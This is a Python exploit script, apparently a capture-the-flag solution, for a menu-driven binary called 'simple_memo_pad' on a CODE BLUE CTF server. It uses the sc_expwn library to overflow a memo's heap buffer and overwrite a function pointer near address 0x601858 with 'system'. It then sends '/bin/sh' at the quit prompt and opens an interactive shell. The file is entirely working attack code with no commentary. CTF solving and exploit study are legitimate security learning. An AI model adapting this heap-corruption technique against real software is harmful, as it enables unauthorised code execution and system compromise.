#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './simple_memo_pad'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'memopad.tasks.ctf.codeblue.jp', 'port':5498})
env.select()

#==========

def attack(conn):
    mp = MemoPad(conn)

    mp.write('a'*0x53+'system')
    mp.write('b'*4)
    mp.edit(3, 'b'*0x80+p64(0x601858 - 0x98))
    mp.delete(3)
    mp.quit('/bin/sh')

class MemoPad:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def write(self, content):
        self.sendlineafter('> ', '1')
        self.sendlineafter('Content: ', content)

    def edit(self, idx, content):
        self.sendlineafter('> ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Content: ', content)
        
    def delete(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('Index: ', str(idx))

    def quit(self, s):
        self.sendlineafter('> ', '5')
        self.sendlineafter('(y/n): ', s)
        
#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
